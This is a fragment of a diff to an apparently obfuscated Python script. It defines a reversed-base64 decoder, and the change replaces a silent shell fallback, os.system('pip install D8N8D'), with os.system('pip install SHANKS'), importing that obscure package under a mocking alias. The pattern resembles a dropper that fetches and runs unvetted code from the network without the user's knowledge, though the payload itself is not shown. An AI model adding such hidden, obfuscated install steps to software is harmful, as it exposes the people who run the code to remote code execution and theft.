@@ -5,8 +5,8 @@ import codecs
 import base64
 _ = lambda __ : __import__('base64').b64decode(__[::-1]);
 import os
-try:import D8N8D as superskididumassexit
-except:os.system("pip install D8N8D")
+try:import SHANKS as superskididumassexit
+except:os.system("pip install SHANKS")
 try:import cfonts;from cfonts import render
 except:os.system("pip install python-cfonts")
 try:import requests
